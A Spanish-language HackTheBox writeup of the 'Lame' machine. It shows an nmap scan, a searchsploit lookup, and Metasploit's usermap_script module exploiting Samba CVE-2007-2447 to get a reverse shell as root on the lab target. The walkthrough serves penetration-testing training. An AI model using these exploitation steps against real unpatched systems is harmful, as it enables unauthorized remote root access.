---
title: "Lame"
description: "Writeup de la m√°quina Lame de HackTheBox. La primera m√°quina retirada de HTB, ideal para principiantes. Explotaci√≥n de Samba (CVE-2007-2447) para obtener root directamente."
date: "2026-01-01"
published: true
tags: ["hackthebox", "pentesting", "writeup", "linux", "samba", "cve-2007-2447"]
readTime: "10 min"
---

# üì¶ Lame ‚Äî Writeup HackTheBox

## üìñ Introducci√≥n

**Lame** es, sin duda, la m√°quina m√°s legendaria de **HackTheBox**. Fue la primera en ser retirada y es, para muchos, el punto de partida en la plataforma. Es una m√°quina **Linux** de dificultad **F√°cil** que demuestra vulnerabilidades cr√≠ticas en servicios antiguos.

En este writeup, explotaremos una vulnerabilidad cl√°sica en **Samba** que nos permitir√° obtener acceso como `root` sin necesidad de escalar privilegios posteriormente.

---

## üîé Reconocimiento

Comenzamos con nuestro escaneo est√°ndar de **Nmap** para identificar puertos y servicios.

```bash
nmap -sVC -T4 -p- 10.10.10.3
```

**Resultados del escaneo:**

- **21/tcp (FTP):** vsftpd 2.3.4 (Famoso por tener un backdoor, aunque en esta m√°quina suele ser un "rabbit hole" o camino falso).
- **22/tcp (SSH):** OpenSSH 4.7p1.
- **139/445 (SMB):** Samba 3.0.20-Debian.
- **3632/tcp (distcc):** distcc v1.

El servicio que m√°s llama la atenci√≥n es **Samba 3.0.20**. Es una versi√≥n muy antigua y probablemente vulnerable.

---

## üïµÔ∏è Enumeraci√≥n y An√°lisis de Vulnerabilidades

### SMB (Samba 3.0.20)

Podemos usar `searchsploit` o Google para buscar vulnerabilidades asociadas a esta versi√≥n espec√≠fica de Samba.

```bash
searchsploit Samba 3.0.20
```

El resultado nos apunta a una vulnerabilidad cr√≠tica: **"Username map script" Command Execution (CVE-2007-2447)**.

> **¬øQu√© es CVE-2007-2447?**
> Esta vulnerabilidad permite a un atacante remoto ejecutar comandos arbitrarios especificando un nombre de usuario que contenga caracteres de shell (`backticks` o comillas invertidas) durante la autenticaci√≥n SMB.

---

## üöÄ Explotaci√≥n

Vamos a explotar esta vulnerabilidad utilizando **Metasploit Framework** por su simplicidad y eficacia para este caso.

### Paso 1: Configuraci√≥n en Metasploit

Iniciamos la consola y buscamos el m√≥dulo correspondiente.

```bash
msfconsole
search usermap_script
use exploit/multi/samba/usermap_script
```

### Paso 2: Configuraci√≥n de Opciones

Configuramos la IP de la m√°quina v√≠ctima (`RHOSTS`) y nuestra IP de atacante (`LHOST`).

```bash
set RHOSTS 10.10.10.3
set LHOST <TU-IP-VPN>
```

Podemos verificar que todo est√© correcto con `show options`.

### Paso 3: Ejecuci√≥n

Lanzamos el exploit.

```bash
exploit
```

Si todo funciona correctamente, Metasploit abrir√° una sesi√≥n de l√≠nea de comandos.

```bash
[*] Started reverse TCP double handler on <TU-IP>:4444 
[*] Accepted the first client connection...
[*] Command shell session 1 opened...
```

---

## üëë Acceso Root

Una vez que tenemos la shell, verificamos qu√© usuario somos.

```bash
whoami
# root
```

¬°Sorpresa! Esta vulnerabilidad nos otorga acceso directo como `root`, por lo que no es necesaria una fase de escalada de privilegios.

Ahora podemos buscar las banderas (flags) de usuario y root.

### User Flag

```bash
cd /home/makis
cat user.txt
```

### Root Flag

```bash
cd /root
cat root.txt
```

---

## üìù Conclusi√≥n

**Lame** es un excelente ejemplo de por qu√© es crucial mantener el software actualizado. Un servicio de Samba obsoleto permiti√≥ comprometer el sistema completo en cuesti√≥n de minutos.

**Puntos clave aprendidos:**
1. Enumeraci√≥n precisa de versiones (Samba 3.0.20).
2. Uso de bases de datos de exploits (Searchsploit/CVE).
3. Explotaci√≥n de RCE (Remote Code Execution) en servicios de red.

¬°M√°quina pwned! üö©
